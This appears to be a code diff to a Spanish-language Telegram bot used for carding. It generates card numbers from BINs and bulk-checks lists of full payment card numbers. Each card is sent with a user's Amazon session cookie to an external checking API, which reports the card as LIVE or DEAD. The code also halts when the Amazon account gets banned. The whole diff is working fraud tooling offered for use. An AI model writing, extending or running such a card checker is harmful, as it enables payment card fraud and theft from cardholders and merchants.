@@ -547,7 +547,7 @@ async function handleGenCommand(chatId, telegramId, fullParam) {
     }
     const tieneX = /[Xx]/.test(input);
     const tieneFecha = /\d{1,2}[\/\-|]\d{2,4}/.test(input);
-    const esExtra = tieneX && tieneFecha;
+    const esExtra = tieneX && tieneFecha && (tieneX || input.trim().split('|')[0].length < 16);
     const esBin = /^\d{6}$/.test(input.trim());
     const esBanco = !esExtra && !esBin;
     try {
@@ -655,9 +655,70 @@ async function handleAmazonCommand(chatId, telegramId, param) {
         await sendSafeMessage(chatId, '🔑 No tienes cookie. Usa /gencookie primero.');
         return;
     }
+ // ========== NUEVA DETECCIÓN ==========
+    // Si el texto tiene saltos de línea y parece una lista de tarjetas completas
+    const containsNewline = param.includes('\n');
+    const cardLines = param.split(/\r?\n/).filter(l => l.trim().length > 0);
+    const isMultiCard = containsNewline && cardLines.length > 1;
+    
+    // Si es una lista de tarjetas, usamos limpiarTarjetas directamente
+    if (isMultiCard) {
+        const tarjetas = limpiarTarjetas(param);
+        if (tarjetas.length === 0) throw new Error('No se encontraron tarjetas válidas.');
+        if (tarjetas.length > 20) return sendSafeMessage(chatId, `⚠️ Máximo 20 tarjetas.`);
+        await sendSafeMessage(chatId, `💳 *Tarjetas a verificar:*\n${tarjetas.map(t => `\`${t}\``).join('\n')}`, { parse_mode: 'Markdown' });
+        // Pasar a verificación directamente
+        const total = tarjetas.length;
+        let progressMsg = await sendSafeMessage(chatId, `🔍 Verificando 0/${total}...`);
+        const resultados = [];
+        for (let i = 0; i < total; i++) {
+            const card = tarjetas[i];
+            try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 120000);
+                const resp = await fetch(API_AMAZON_CHECK_URL, {
+                    method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ card, cookies: cookie }), signal: controller.signal
+                });
+                clearTimeout(timeoutId);
+                const data = await resp.json();
+                const isFatalError = data.message && (
+                    data.message.toLowerCase().includes('cookie expirada') ||
+                    data.message.toLowerCase().includes('inicia sesión') ||
+                    data.message.toLowerCase().includes('cuenta baneada') ||
+                    data.message.toLowerCase().includes('account banned') ||
+                    data.message.toLowerCase().includes('entra a mi cuenta')
+                );
+                resultados.push({ card, status: data.status, message: data.message });
+                if (isFatalError) {
+                    await sendSafeMessage(chatId, `⛔ Error fatal: ${data.message}. No se continuará.`);
+                    break;
+                }
+            } catch (err) {
+                resultados.push({ card, status: 'ERROR', message: err.message });
+            }
+            const emoji = resultados[i].status === 'LIVE' ? '✅' : (resultados[i].status === 'DEAD' ? '❌' : '⚠️');
+            try {
+                await bot.editMessageText(`🔍 Verificando ${i+1}/${total}\nÚltima: ${card} → ${resultados[i].status} ${emoji}`, { chat_id: chatId, message_id: progressMsg.message_id });
+            } catch (e) {}
+            await new Promise(r => setTimeout(r, 800));
+        }
+        const separador = SEPARATORS[Math.floor(Math.random() * SEPARATORS.length)];
+        let resumen = `📊 *Resultados finales*\n${separador}\n`;
+        for (const r of resultados) {
+            const emoji = r.status === 'LIVE' ? '✅' : (r.status === 'DEAD' ? '❌' : '⚠️');
+            resumen += `• Card: \`${r.card}\`\n• Status: ${r.status} ${emoji}\n${separador}\n`;
+        }
+        if (resumen.length > 4096) resumen = resumen.substring(0,4000) + '...';
+        await sendSafeMessage(chatId, resumen, { parse_mode: 'Markdown' });
+        return;
+    }
+
+    // Si no es lista, proceder con la detección normal (bin, extra, banco, etc.)
     const esBin = /^\d{6}$/.test(param);
     let normalizedParam = normalizarExtra(param);
-    const esExtra = normalizedParam.includes('|') && /[0-9X]+\|\d{1,2}\|\d{2,4}/.test(normalizedParam);
+    // Para que sea "extra", debe contener X O el número base tener menos de 16 dígitos (para evitar detectar tarjetas completas)
+    const extraPattern = /[0-9X]{6,16}\|\d{1,2}\|\d{2,4}/;
+    const esExtra = normalizedParam.includes('|') && extraPattern.test(normalizedParam) && (normalizedParam.includes('X') || normalizedParam.split('|')[0].length < 16);
     const esBanco = !esBin && !esExtra;
     try {
         let tarjetas = [];
